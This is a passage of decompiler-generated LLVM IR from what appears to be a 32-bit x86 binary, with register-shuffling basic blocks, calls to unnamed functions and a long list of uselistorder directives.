  %v2_8049f9e = inttoptr i32 %v1_8049f9e to i32*
  %v3_8049f9e = load i32, i32* %v2_8049f9e, align 4
  %v1_8049fa2 = add i32 %v0_8049f9e, 20612
  store i32 %v1_8049fa2, i32* %ecx.global-to-local, align 4
  %v0_8049fa9 = load i32, i32* %eax.global-to-local, align 4
  %v1_8049fa9 = add i32 %v0_8049fa9, 16
  store i32 %v1_8049fa9, i32* %eax.global-to-local, align 4
  %v1_8049fac = add i32 %v3_8049f9e, 1452
  %v9_8049fac = icmp eq i32 %v1_8049fac, 0
  store i1 %v9_8049fac, i1* %zf.global-to-local, align 1
  store i32 %v1_8049fac, i32* %edx.global-to-local, align 4
  %v2_8049fb2 = add i32 %v0_8049f9e, 20
  %v3_8049fb2 = inttoptr i32 %v2_8049fb2 to i32*
  store i32 %v1_8049fa2, i32* %v3_8049fb2, align 4
  %v0_8049fb6 = load i32, i32* %eax.global-to-local, align 4
  %v1_8049fb6 = load i32, i32* @esp, align 4
  %v2_8049fb6 = add i32 %v1_8049fb6, 28
  %v3_8049fb6 = inttoptr i32 %v2_8049fb6 to i32*
  store i32 %v0_8049fb6, i32* %v3_8049fb6, align 4
  %v0_8049fba = load i32, i32* %edx.global-to-local, align 4
  %v1_8049fba = load i32, i32* @esp, align 4
  %v2_8049fba = add i32 %v1_8049fba, 32
  %v3_8049fba = inttoptr i32 %v2_8049fba to i32*
  store i32 %v0_8049fba, i32* %v3_8049fba, align 4
  %v0_80484e5.pre.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_80484e5.preheader

dec_label_pc_8049fc3:                             ; preds = %dec_label_pc_804848a
  %v9_8049fc3 = icmp eq i32 %v0_80484a0, 12
  store i1 %v9_8049fc3, i1* %zf.global-to-local, align 1
  %v1_8049fc6 = add i32 %v0_80484a0, -16
  %v2_8049fc6 = inttoptr i32 %v1_8049fc6 to i32*
  store i32 48, i32* %v2_8049fc6, align 4
  %v2_8049fc8 = call i32 @function_8051cd0(i8 %v1_8049f3f)
  store i32 %v2_8049fc8, i32* %eax.global-to-local, align 4
  %v0_8049fcd = load i32, i32* @esp, align 4
  %v1_8049fcd = inttoptr i32 %v0_8049fcd to i32*
  %v2_8049fcd = load i32, i32* %v1_8049fcd, align 4
  store i32 %v2_8049fcd, i32* @ebx, align 4
  %v3_8049fcd = add i32 %v0_8049fcd, 4
  %v1_8049fce = inttoptr i32 %v3_8049fcd to i32*
  store i32 0, i32* %v1_8049fce, align 4
  store i32 48, i32* %v1_8049fcd, align 4
  %v3_8049fd3 = call i32 @function_8051c20(i32 %tmp, i32* nonnull @0)
  store i32 %v3_8049fd3, i32* %eax.global-to-local, align 4
  %v0_8049fd8 = load i32, i32* @esp, align 4
  %v1_8049fd8 = inttoptr i32 %v0_8049fd8 to i32*
  %v2_8049fd8 = load i32, i32* %v1_8049fd8, align 4
  store i32 %v2_8049fd8, i32* %edx.global-to-local, align 4
  %v3_8049fd8 = add i32 %v0_8049fd8, 4
  %v1_8049fd9 = inttoptr i32 %v3_8049fd8 to i32*
  %v2_8049fd9 = load i32, i32* %v1_8049fd9, align 4
  store i32 %v2_8049fd9, i32* %ecx.global-to-local, align 4
  store i32 %v3_8049fd3, i32* %v1_8049fd9, align 4
  %v0_8049fdb = load i32, i32* @esi, align 4
  %v1_8049fdb = add i32 %v0_8049fdb, 20
  store i32 %v1_8049fdb, i32* %eax.global-to-local, align 4
  store i32 %v1_8049fdb, i32* %v1_8049fd8, align 4
  %v3_8049fdf = call i32 @function_8052640(i8* %v2_8049f7d, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_8049fdf, i32* %eax.global-to-local, align 4
  %v0_8049fe4 = load i32, i32* @esp, align 4
  %v1_8049fe4 = inttoptr i32 %v0_8049fe4 to i32*
  store i32 48, i32* %v1_8049fe4, align 4
  %v2_8049feb = call i32 @function_8051c50(i8 %v1_8049f3f)
  store i32 %v2_8049feb, i32* %eax.global-to-local, align 4
  %v0_8049ff0 = load i32, i32* @esp, align 4
  %v1_8049ff0 = add i32 %v0_8049ff0, 16
  %v6_8049ff0 = icmp eq i32 %v1_8049ff0, 0
  store i1 %v6_8049ff0, i1* %zf.global-to-local, align 1
  br label %dec_label_pc_8049f6a

dec_label_pc_8049ff8:                             ; preds = %dec_label_pc_804848a
  %v9_8049ff8 = icmp eq i32 %v0_80484a0, 12
  store i1 %v9_8049ff8, i1* %zf.global-to-local, align 1
  %v1_8049ffb = add i32 %v0_80484a0, -16
  %v2_8049ffb = inttoptr i32 %v1_8049ffb to i32*
  store i32 49, i32* %v2_8049ffb, align 4
  %v2_8049ffd = call i32 @function_8051cd0(i8 %v1_8049f3f)
  store i32 %v2_8049ffd, i32* %eax.global-to-local, align 4
  %v0_804a002 = load i32, i32* @esp, align 4
  %v1_804a002 = inttoptr i32 %v0_804a002 to i32*
  %v2_804a002 = load i32, i32* %v1_804a002, align 4
  store i32 %v2_804a002, i32* @ebx, align 4
  %v3_804a002 = add i32 %v0_804a002, 4
  %v1_804a003 = inttoptr i32 %v3_804a002 to i32*
  store i32 0, i32* %v1_804a003, align 4
  store i32 49, i32* %v1_804a002, align 4
  %v3_804a008 = call i32 @function_8051c20(i32 %tmp, i32* nonnull @0)
  store i32 %v3_804a008, i32* %eax.global-to-local, align 4
  %v0_804a00d = load i32, i32* @esp, align 4
  %v1_804a00d = inttoptr i32 %v0_804a00d to i32*
  %v2_804a00d = load i32, i32* %v1_804a00d, align 4
  store i32 %v2_804a00d, i32* %edx.global-to-local, align 4
  %v3_804a00d = add i32 %v0_804a00d, 4
  %v1_804a00e = inttoptr i32 %v3_804a00d to i32*
  %v2_804a00e = load i32, i32* %v1_804a00e, align 4
  store i32 %v2_804a00e, i32* %ecx.global-to-local, align 4
  store i32 %v3_804a008, i32* %v1_804a00e, align 4
  %v0_804a010 = load i32, i32* @esi, align 4
  %v1_804a010 = add i32 %v0_804a010, 20
  store i32 %v1_804a010, i32* %eax.global-to-local, align 4
  store i32 %v1_804a010, i32* %v1_804a00d, align 4
  %v3_804a014 = call i32 @function_8052640(i8* %v2_8049f7d, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_804a014, i32* %eax.global-to-local, align 4
  %v0_804a019 = load i32, i32* @esp, align 4
  %v1_804a019 = inttoptr i32 %v0_804a019 to i32*
  store i32 49, i32* %v1_804a019, align 4
  %v2_804a020 = call i32 @function_8051c50(i8 %v1_8049f3f)
  store i32 %v2_804a020, i32* %eax.global-to-local, align 4
  %v0_804a025 = load i32, i32* @esp, align 4
  %v1_804a025 = add i32 %v0_804a025, 16
  %v6_804a025 = icmp eq i32 %v1_804a025, 0
  store i1 %v6_804a025, i1* %zf.global-to-local, align 1
  br label %dec_label_pc_8049f6a

dec_label_pc_804a062:                             ; preds = %dec_label_pc_804848a
  %v9_804a062 = icmp eq i32 %v0_80484a0, 12
  store i1 %v9_804a062, i1* %zf.global-to-local, align 1
  %v1_804a065 = add i32 %v0_80484a0, -16
  %v2_804a065 = inttoptr i32 %v1_804a065 to i32*
  store i32 50, i32* %v2_804a065, align 4
  %v2_804a067 = call i32 @function_8051cd0(i8 -122)
  store i32 %v2_804a067, i32* %eax.global-to-local, align 4
  %v0_804a06c = load i32, i32* @esp, align 4
  %v1_804a06c = inttoptr i32 %v0_804a06c to i32*
  %v2_804a06c = load i32, i32* %v1_804a06c, align 4
  store i32 %v2_804a06c, i32* @ebx, align 4
  %v3_804a06c = add i32 %v0_804a06c, 4
  %v1_804a06d = inttoptr i32 %v3_804a06c to i32*
  store i32 0, i32* %v1_804a06d, align 4
  store i32 50, i32* %v1_804a06c, align 4
  %v3_804a072 = call i32 @function_8051c20(i32 134567046, i32* %v2_804a072)
  store i32 %v3_804a072, i32* %eax.global-to-local, align 4
  %v0_804a077 = load i32, i32* @esp, align 4
  %v1_804a077 = inttoptr i32 %v0_804a077 to i32*
  %v2_804a077 = load i32, i32* %v1_804a077, align 4
  store i32 %v2_804a077, i32* %edx.global-to-local, align 4
  %v3_804a077 = add i32 %v0_804a077, 4
  %v1_804a078 = inttoptr i32 %v3_804a077 to i32*
  %v2_804a078 = load i32, i32* %v1_804a078, align 4
  store i32 %v2_804a078, i32* %ecx.global-to-local, align 4
  store i32 %v3_804a072, i32* %v1_804a078, align 4
  %v0_804a07a = load i32, i32* @esi, align 4
  %v1_804a07a = add i32 %v0_804a07a, 20
  store i32 %v1_804a07a, i32* %eax.global-to-local, align 4
  store i32 %v1_804a07a, i32* %v1_804a077, align 4
  %v3_804a07e = call i32 @function_8052640(i8* inttoptr (i32 134567046 to i8*), i32 %v0_804816e)
  store i32 %v3_804a07e, i32* %eax.global-to-local, align 4
  %v0_804a083 = load i32, i32* @esp, align 4
  %v1_804a083 = inttoptr i32 %v0_804a083 to i32*
  store i32 50, i32* %v1_804a083, align 4
  %v2_804a08a = call i32 @function_8051c50(i8 -122)
  store i32 %v2_804a08a, i32* %eax.global-to-local, align 4
  %v0_804a08f = load i32, i32* @esp, align 4
  %v1_804a08f = add i32 %v0_804a08f, 16
  %v6_804a08f = icmp eq i32 %v1_804a08f, 0
  store i1 %v6_804a08f, i1* %zf.global-to-local, align 1
  br label %dec_label_pc_8049f6a

; uselistorder directives
  uselistorder i32 %v1_804a08f, { 1, 0 }
  uselistorder i32 %v2_804a08a, { 1, 0 }
  uselistorder i32 %v1_804a025, { 1, 0 }
  uselistorder i32 %v2_804a020, { 1, 0 }
  uselistorder i32 %v1_8049ff0, { 1, 0 }
  uselistorder i32 %v2_8049feb, { 1, 0 }
  uselistorder i1 %v15_8049f85, { 1, 0 }
  uselistorder i32 %v1_8049f6a, { 0, 1, 2, 5, 4, 3 }
  uselistorder i1 %v14_8049f0e, { 1, 0 }
  uselistorder i32 %v1_8049f0b, { 1, 0 }
  uselistorder i32 %v0_8049f0b, { 1, 0, 2 }
  uselistorder i32 %v2_8049f06, { 0, 2, 1 }
  uselistorder i32 %v0_8049eff, { 1, 0 }
  uselistorder i8 %v2_8049edb, { 1, 2, 0 }
  uselistorder i32 %v0_8049edb, { 1, 0 }
  uselistorder i1 %v10_8049ec8, { 1, 0 }
  uselistorder i1 %v10_8049eb8, { 1, 0 }
  uselistorder i32 %v0_8049eac, { 0, 2, 3, 1 }
  uselistorder i32 %v0_8049ea9, { 1, 0 }
  uselistorder i32 %v1_8049e91, { 1, 0 }
  uselistorder i1 %v12_8049e75, { 1, 0 }
  uselistorder i32 %v2_8049e2f, { 1, 0 }
  uselistorder i32 %v1_8049e03, { 1, 0, 2 }
  uselistorder i32 %v2_8049dd6, { 1, 0 }
  uselistorder i32 %v2_8049dc2, { 1, 0 }
  uselistorder i32 %v1_8049daf, { 1, 0 }
  uselistorder i32 %v0_8049dac, { 4, 0, 1, 2, 3, 5 }
  uselistorder i32 %v2_8049da7, { 1, 4, 0, 3, 2, 5 }
  uselistorder i32 %v1_8049d8b, { 1, 0 }
  uselistorder i32 %v0_8049d6b, { 4, 0, 1, 2, 3, 5 }
  uselistorder i32 %v1_8049d36, { 1, 0 }
  uselistorder i32 %v0_8049d33, { 4, 0, 1, 2, 3, 5 }
  uselistorder i32 %v2_8049d2e, { 0, 2, 1, 3 }
  uselistorder i32 %v1_8049d04, { 1, 0 }
  uselistorder i32 %v0_8049d01, { 4, 0, 1, 2, 3, 5 }
  uselistorder i32 %v2_8049cfc, { 4, 1, 0, 3, 2, 5 }
  uselistorder i32 %v0_8049cf1, { 1, 0, 2 }
  uselistorder i32 %v0_8049ce8, { 1, 0 }
  uselistorder i32 %v1_8049cd5, { 1, 0 }
  uselistorder i32 %v2_8049ccd, { 0, 3, 2, 4, 1 }
  uselistorder i32 %v0_8049cb2, { 1, 0, 2 }
  uselistorder i32 %v9_8049c6e, { 1, 0 }
  uselistorder i32 %v5_8049c66, { 1, 2, 0 }
  uselistorder i32 %v0_8049c5b, { 1, 2, 0 }
  uselistorder i32 %v1_8049c29, { 1, 0 }
  uselistorder i32 %v1_8049c14, { 0, 1, 4, 3, 2 }
  uselistorder i32 %v1_8049c09, { 1, 0 }
  uselistorder i32 %v2_8049c04, { 0, 2, 1, 3 }
  uselistorder i32 %v1_8049bd4, { 1, 0 }
  uselistorder i32 %v0_8049bd1, { 4, 0, 1, 2, 3, 5 }
  uselistorder i32 %v2_8049bcc, { 0, 2, 1, 3 }
  uselistorder i32 %v1_8049ba2, { 1, 0 }
  uselistorder i32 %v0_8049b9f, { 4, 0, 1, 2, 3, 5 }
  uselistorder i32 %v2_8049b9a, { 4, 3, 0, 2, 1, 5 }
  uselistorder i32 %v0_8049b8f, { 1, 0, 2 }
  uselistorder i32 %v0_8049b86, { 1, 0 }
  uselistorder i8 %v2_8049b80, { 1, 2, 0 }
  uselistorder i32 %v0_8049b80, { 1, 0 }
  uselistorder i1 %v10_8049b6d, { 1, 0 }
  uselistorder i1 %v10_8049b5d, { 1, 0 }
  uselistorder i32 %v0_8049b52, { 1, 0, 2, 3 }
  uselistorder i1 %v12_8049b28, { 1, 0 }
  uselistorder i1 %v11_8049b0f, { 1, 0 }
  uselistorder i32 %v4_8049ae5, { 1, 0 }
  uselistorder i32 %v0_8049aa9, { 4, 1, 2, 3, 0 }
  uselistorder i32 %v0_8049aa4, { 2, 1, 0, 3 }
  uselistorder i32 %v0_8049a90, { 1, 0, 2 }
  uselistorder i32 %v0_8049a77, { 5, 4, 3, 2, 1, 0 }
  uselistorder i1 %v11_8049a40, { 1, 0 }
  uselistorder i1 %v9_8049a37, { 1, 0 }
  uselistorder i32 %v1_8049a34, { 1, 0 }
  uselistorder i32 %v0_8049a25, { 1, 2, 3, 0 }
  uselistorder i32 %v0_8049a0a, { 1, 0 }
  uselistorder i32 %v0_80499fd, { 1, 0 }
  uselistorder i32 %v3_80499d9, { 0, 1, 3, 2 }
  uselistorder i32 %v1_80499d4, { 3, 2, 1, 0 }
  uselistorder i1 %v13_80499ca, { 1, 0 }
  uselistorder i32 %v3_80499c3, { 2, 1, 0, 3 }
  uselistorder i32 %v0_804997c, { 1, 0, 2 }
  uselistorder i1 %v10_8049944, { 1, 0 }
  uselistorder i32 %v0_8049944, { 1, 0 }
  uselistorder i32 %v1_80498e7, { 1, 0 }
  uselistorder i1 %v10_80498d9, { 1, 0 }
  uselistorder i32 %v0_80498cf, { 2, 3, 0, 1, 4, 5 }
  uselistorder i32 %v0_80498a0, { 6, 1, 2, 3, 4, 5, 7, 0 }
  uselistorder i32 %v0_804988a, { 1, 2, 3, 4, 5, 0 }
  uselistorder i32 %v0_8049875, { 3, 0, 1, 2, 4 }
  uselistorder i32 %v0_804985f, { 1, 2, 3, 4, 5, 0 }
  uselistorder i32 %v5_8049845, { 1, 2, 0 }
  uselistorder i32 %v1_8049845, { 1, 0 }
  uselistorder i32 %v3_804983f, { 0, 1, 3, 4, 2 }
  uselistorder i32 %v2_8049834, { 1, 0 }
  uselistorder i32 %v1_8049831, { 1, 0 }
  uselistorder i32 %v0_80497f9, { 1, 2, 0 }
  uselistorder i1 %v11_80497f0, { 1, 0 }
  uselistorder i32 %v1_80497ab, { 1, 0 }
  uselistorder i32 %v5_804978f, { 1, 2, 0 }
  uselistorder i32 %v1_804978f, { 1, 0 }
  uselistorder i32 %v3_8049789, { 0, 1, 3, 4, 2 }
  uselistorder i32 %v2_804977e, { 1, 0 }
  uselistorder i32 %v1_804977b, { 1, 0 }
  uselistorder i32 %v3_8049754, { 1, 0, 2 }
  uselistorder i32 %v1_804974f, { 3, 2, 1, 0 }
  uselistorder i32 %v0_804970b, { 0, 2, 1, 3 }
  uselistorder i32 %v0_80496ee, { 4, 0, 1, 2, 3 }
  uselistorder i32 %v4_80496b9, { 1, 0 }
  uselistorder i32 %v0_80496b5, { 2, 0, 1, 3 }
  uselistorder i32 %v0_8049679, { 1, 0, 2, 3 }
  uselistorder i32 %v1_8049628, { 0, 2, 1 }
  uselistorder i32 %v1_8049605, { 0, 1, 4, 3, 2 }
  uselistorder i1 %v9_80495f5, { 1, 0 }
  uselistorder i1 %v12_80495e4, { 1, 0 }
  uselistorder i32 %v0_80495e0, { 0, 2, 1 }
  uselistorder i32 %v3_80495d1, { 3, 7, 8, 5, 6, 1, 0, 2, 4 }
  uselistorder i32 %v0_8049542, { 1, 0 }
  uselistorder i1 %v12_8049581, { 1, 0 }
  uselistorder i1 %v12_804956d, { 1, 0 }
  uselistorder i32 %v0_8049562, { 3, 2, 1, 0, 4 }
  uselistorder i1 %v11_8049559, { 1, 0 }
  uselistorder i32 %v2_804954a, { 1, 2, 0 }
  uselistorder i32 %v3_8049542, { 1, 2, 0, 3, 4 }
  uselistorder i1 %v10_8049518, { 1, 0 }
  uselistorder i1 %v9_80494cc, { 1, 0 }
  uselistorder i32 %v0_80494b4, { 1, 0, 2, 3 }
  uselistorder i1 %v11_8049496, { 1, 0 }
  uselistorder i1 %v9_804948d, { 1, 0 }
  uselistorder i32 %v0_804948a, { 5, 1, 2, 3, 4, 0, 6 }
  uselistorder i32 %v1_8049465, { 0, 2, 1 }
  uselistorder i1 %v10_8049457, { 1, 0 }
  uselistorder i32 %v0_804944d, { 2, 3, 4, 0, 1, 5, 6 }
  uselistorder i32 %v0_804941e, { 6, 1, 2, 3, 4, 5, 7, 0 }
  uselistorder i32 %v0_8049408, { 1, 2, 3, 4, 5, 0 }
  uselistorder i32 %v0_80493f3, { 0, 4, 1, 2, 3 }
  uselistorder i32 %v0_80493dd, { 1, 2, 3, 4, 5, 0 }
  uselistorder i32 %v5_80493c3, { 1, 2, 0 }
  uselistorder i32 %v1_80493c3, { 1, 0 }
  uselistorder i32 %v3_80493bd, { 0, 1, 3, 4, 2 }
  uselistorder i32 %v2_80493b2, { 1, 0 }
  uselistorder i32 %v1_80493af, { 1, 0 }
  uselistorder i32 %v2_8049377, { 1, 0 }
  uselistorder i32 %v1_8049364, { 1, 0 }
  uselistorder i32 %v0_8049361, { 5, 0, 1, 2, 3, 4, 6 }
  uselistorder i32 %v2_804935c, { 0, 2, 1, 3 }
  uselistorder i32 %v0_8049358, { 1, 0 }
  uselistorder i32 %v5_8049353, { 1, 2, 0 }
  uselistorder i32 %v4_8049353, { 0, 2, 1 }
  uselistorder i32 %v2_8049322, { 1, 0 }
  uselistorder i32 %v2_80492f7, { 1, 2, 0 }
  uselistorder i32 %v3_80492ed, { 0, 1, 3, 4, 2 }
  uselistorder i32* %v2_80492ed, { 0, 2, 1 }
  uselistorder i32 %v0_80492e4, { 1, 0 }
  uselistorder i32 %v0_80492bf, { 0, 2, 1 }
  uselistorder i32 %v0_8049297, { 3, 0, 1, 2, 4 }
  uselistorder i32 %v1_8049286, { 1, 0 }
  uselistorder i1 %v10_804926b, { 1, 0 }
  uselistorder i32 %v0_8049266, { 5, 0, 1, 2, 3, 4, 6 }
  uselistorder i32 %v0_8049261, { 2, 3, 0, 1, 4, 5 }
  uselistorder i1 %v11_804923f, { 1, 0 }
  uselistorder i32 %v0_8049226, { 1, 2, 3, 4, 0 }
  uselistorder i32 %v4_8049211, { 1, 0 }
  uselistorder i32 %v0_8049203, { 3, 0, 1, 2, 8, 4, 5, 6, 7 }
  uselistorder i32 %v0_80491eb, { 3, 0, 1, 2, 4 }
  uselistorder i32 %v1_80491e0, { 3, 2, 1, 0 }
  uselistorder i32 %v1_80491b3, { 0, 2, 1 }
  uselistorder i1 %v10_80491a9, { 1, 0 }
  uselistorder i32 %v0_804919f, { 2, 3, 4, 0, 1, 5, 6 }
  uselistorder i32 %v0_8049170, { 6, 1, 2, 3, 4, 5, 7, 0 }
  uselistorder i32 %v0_804915a, { 1, 2, 3, 4, 5, 0 }
  uselistorder i32 %v0_8049145, { 0, 4, 1, 2, 3 }
  uselistorder i32 %v0_804912f, { 1, 2, 3, 4, 5, 0 }
  uselistorder i32 %v1_8049124, { 3, 2, 1, 0 }
  uselistorder i32 %v0_8049107, { 1, 2, 3, 0 }
  uselistorder i32 %v1_80490de, { 0, 2, 1 }
  uselistorder i1 %v10_80490d4, { 1, 0 }
  uselistorder i32 %v0_80490ca, { 2, 3, 4, 0, 1, 5, 6 }
  uselistorder i32 %v0_804909b, { 6, 1, 2, 3, 4, 5, 7, 0 }
  uselistorder i32 %v0_8049085, { 1, 2, 3, 4, 5, 0 }
  uselistorder i32 %v0_8049070, { 3, 0, 1, 2, 4 }
  uselistorder i32 %v0_804905a, { 1, 2, 3, 4, 5, 0 }
  uselistorder i32 %v0_8049027, { 1, 2, 3, 0 }
  uselistorder i32 %v1_8048ffe, { 0, 2, 1 }
  uselistorder i1 %v10_8048ff4, { 1, 0 }
  uselistorder i32 %v0_8048fea, { 2, 3, 4, 0, 1, 5, 6 }
  uselistorder i32 %v0_8048fbb, { 6, 1, 2, 3, 4, 5, 7, 0 }
  uselistorder i32 %v0_8048fa5, { 1, 2, 3, 4, 5, 0 }
  uselistorder i32 %v0_8048f90, { 3, 0, 1, 2, 4 }
  uselistorder i32 %v0_8048f7a, { 1, 2, 3, 4, 5, 0 }
  uselistorder i32 %v0_8048f3e, { 1, 2, 3, 4, 5, 0 }
  uselistorder i32 %v1_8048f33, { 3, 2, 1, 0 }
  uselistorder i32 %v0_8048f0d, { 1, 2, 3, 4, 5, 0 }
  uselistorder i32* %v2_8049ae5, { 1, 0 }
  uselistorder i32 %v0_8048ed7, { 5, 1, 2, 3, 4, 0 }
  uselistorder i32 %v0_8048e4a, { 1, 2, 0 }
  uselistorder i32 %v0_8048e05, { 1, 2, 3, 4, 5, 6, 7, 0 }
  uselistorder i32 %v0_8048ddc, { 2, 0, 1 }
  uselistorder i32 %v1_8048dd9, { 1, 0 }
  uselistorder i32 %v2_8048dd6, { 1, 0 }
  uselistorder i1 %v10_8048dcd, { 1, 0 }
  uselistorder i32 %v3_8048dc7, { 1, 0, 2, 4, 3 }
  uselistorder i1 %v15_8048dab, { 1, 0 }
  uselistorder i32 %v0_8048da7, { 2, 1, 3, 4, 0 }
  uselistorder i1 %v10_8048d89, { 1, 0 }
  uselistorder i1 %v10_8048d81, { 1, 0 }
  uselistorder i1 %v10_8048d79, { 1, 0 }
  uselistorder i32 %v1_8048d5d, { 1, 0 }
  uselistorder i32 %v2_8048d5a, { 1, 0 }
  uselistorder i32 %v0_8048d58, { 1, 0 }
  uselistorder i32 %v1_8048e7a, { 4, 3, 2, 1, 0, 5, 6 }
  uselistorder i32 %v0_8048d26, { 1, 0 }
  uselistorder i32 %v0_8048cff, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 0 }
  uselistorder i32 %v5_8048cce, { 1, 2, 0 }
  uselistorder i32 %v0_8048cce, { 1, 0 }
  uselistorder i32 %v3_8048cc8, { 0, 2, 3, 1 }
  uselistorder i32 %v2_8048cbd, { 1, 0 }
  uselistorder i32 %v1_8048cba, { 1, 0 }
  uselistorder i32 %v0_8048c9d, { 0, 2, 1 }
  uselistorder i32 %v5_8048c82, { 1, 2, 0 }
  uselistorder i32 %v3_8048c7c, { 0, 2, 3, 1 }
  uselistorder i32 %v0_8048c71, { 1, 0 }
  uselistorder i32 %v2_8048c6e, { 1, 0 }
  uselistorder i32 %v1_8048c6b, { 1, 0 }
  uselistorder i32 %v0_8048c28, { 2, 1, 0 }
  uselistorder i32 %v0_8048c1d, { 4, 0, 1, 2, 3, 5 }
  uselistorder i32 %v1_8048c10, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_8048bdb, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v0_8048bb4, { 2, 1, 0 }
  uselistorder i32 %v0_8048b8a, { 2, 1, 0 }
  uselistorder i32 %v5_8048b85, { 1, 2, 0 }
  uselistorder i32 %v4_8048b85, { 0, 2, 1 }
  uselistorder i32 %v0_8048b24, { 2, 1, 0 }
  uselistorder i32 %v0_8048ae3, { 1, 3, 2, 0 }
  uselistorder i32 %v0_8048a9b, { 2, 0, 1, 3 }
  uselistorder i32 %v0_80489b5, { 1, 0, 2, 3 }
  uselistorder i32 %v5_80486da, { 1, 2, 0 }
  uselistorder i32 %v3_80486d4, { 1, 0, 2, 3 }
  uselistorder i32 %v2_80486c6, { 1, 0 }
  uselistorder i32 %v1_80486c3, { 1, 0 }
  uselistorder i32 %v12_804862d, { 1, 0 }
  uselistorder i32 %v0_804862a, { 2, 0, 1 }
  uselistorder i1 %v10_8048616, { 1, 0 }
  uselistorder i32 %v3_8048608, { 1, 0, 2, 3 }
  uselistorder i32 %v1_8048601, { 3, 2, 1, 0 }
  uselistorder i32 %v1_8048601.pre, { 1, 2, 0 }
  uselistorder i1 %v10_80485f0, { 1, 0 }
  uselistorder i32 %v3_80485ea, { 1, 0, 2 }
  uselistorder i1 %v10_80485ae, { 1, 0 }
  uselistorder i1 %v6_80485ae, { 1, 0 }
  uselistorder i8 %v3_80485a5, { 5, 6, 7, 4, 3, 2, 1, 0 }
  uselistorder i8* %v2_80485a5, { 0, 1, 3, 2 }
  uselistorder i32 %v0_80485a5, { 7, 6, 5, 2, 4, 0, 1, 8, 3 }
  uselistorder i1 %v15_804859b, { 1, 0 }
  uselistorder i32 %v0_8048597, { 1, 2, 3, 4, 0 }
  uselistorder i1 %v10_8048557, { 1, 0 }
  uselistorder i1 %v10_804854f, { 1, 0 }
  uselistorder i1 %v10_8048547, { 1, 0 }
  uselistorder i1 %v10_804853f, { 1, 0 }
  uselistorder i1 %v10_8048537, { 1, 0 }
  uselistorder i32 %v3_8048505, { 1, 0 }
  uselistorder i32 %v3_80484fc, { 1, 0 }
  uselistorder i32 %v0_80484e5, { 1, 0 }
  uselistorder i8* %v1_8048752, { 21, 20, 25, 5, 4, 3, 2, 1, 0, 31, 30, 29, 28, 27, 26, 43, 42, 41, 38, 37, 40, 39, 36, 35, 24, 23, 22, 33, 32, 19, 18, 17, 16, 79, 6, 8, 7, 34, 15, 47, 46, 45, 44, 14, 49, 48, 13, 52, 51, 50, 12, 55, 54, 53, 11, 10, 9, 78, 76, 77, 80, 81, 72, 73, 68, 69, 70, 71, 74, 75, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109 }
  uselistorder i32* %v1_80484ea, { 1, 0, 2, 3 }
  uselistorder i32 %stack_var_-20924.0.ph, { 13, 17, 16, 14, 12, 11, 28, 27, 26, 25, 24, 15, 10, 18, 9, 19, 8, 21, 20, 7, 23, 22, 6, 5, 4, 2, 3, 42, 41, 40, 39, 38, 35, 34, 32, 31, 30, 29, 1, 33, 44, 43, 37, 36, 0 }
  uselistorder i32 %v2_80484ac, { 1, 2, 0, 3 }
  uselistorder i32 %v0_80484a0, { 8, 3, 7, 2, 6, 1, 4, 5, 0, 9 }
  uselistorder i8 %tmp242, { 1, 0 }
  uselistorder i32 %v1_804841e, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_80483ff, { 1, 2, 3, 4, 0 }
  uselistorder i1 %v12_80483e9, { 1, 0 }
  uselistorder i32 %v0_80483e6, { 2, 1, 0, 3 }
  uselistorder i8 %v1_8049f3f, { 1, 0, 3, 2, 4, 5 }
  uselistorder i8* %v2_8049f7d, { 0, 1, 3, 2 }
  uselistorder i8* %v2_80483e1, { 2, 3, 4, 0, 1, 5 }
  uselistorder i32 %.v0_80482dd, { 5, 3, 4, 0, 1, 2 }
  uselistorder i32 %v2_80482a5, { 1, 0, 2 }
  uselistorder i32 %v4_80482a0, { 1, 2, 0 }
  uselistorder i32 %v1_80482d3, { 2, 3, 1, 0 }
  uselistorder i8* %v3_80482a0.pre, { 1, 2, 0 }
  uselistorder i8 %v1_80482c3, { 1, 0 }
  uselistorder i32 %v1_804828d, { 1, 0 }
  uselistorder i32 %v2_8048285, { 0, 3, 2, 4, 1 }
  uselistorder i32 %v1_8048278, { 1, 0 }
  uselistorder i32 %v2_8048270, { 0, 3, 2, 4, 1 }
  uselistorder i32 %v2_804824e, { 1, 2, 0, 3 }
  uselistorder i1 %v9_8048246, { 1, 0, 2, 3, 4 }
  uselistorder i8* %tmp237, { 0, 2, 1 }
  uselistorder i32 %v6_80481f3, { 2, 1, 0, 4, 3, 5 }
  uselistorder i32 %v5_80481e1, { 2, 1, 0, 4, 3, 5 }
  uselistorder i32 %v6_80481cf, { 0, 2, 1, 3, 4, 5, 6, 7 }
  uselistorder i32 %v0_804816e, { 1, 0, 2 }
  uselistorder i32* %stack_var_4, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32* %stack_var_-20972, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 0, 15, 16, 17, 18, 19, 20, 21 }
  uselistorder i32 %tmp, { 4, 3, 1, 0, 2, 5 }
  uselistorder i1* %zf.global-to-local, { 0, 1, 2, 3, 4, 5, 8, 9, 10, 6, 7, 11, 12, 13, 14, 15, 17, 16, 57, 18, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 19, 20, 21, 22, 23, 24, 45, 46, 48, 50, 51, 53, 54, 55, 56, 58, 60, 61, 63, 64, 65, 66, 67, 68, 69, 70, 71, 73, 72, 47, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 88, 89, 87, 52, 49, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 225, 226, 227, 228, 125, 126, 127, 128, 129, 139, 130, 131, 132, 133, 134, 135, 136, 137, 138, 140, 141, 142, 143, 144, 145, 146, 147, 148, 149, 150, 151, 152, 153, 154, 155, 156, 157, 158, 159, 160, 161, 162, 163, 164, 165, 166, 167, 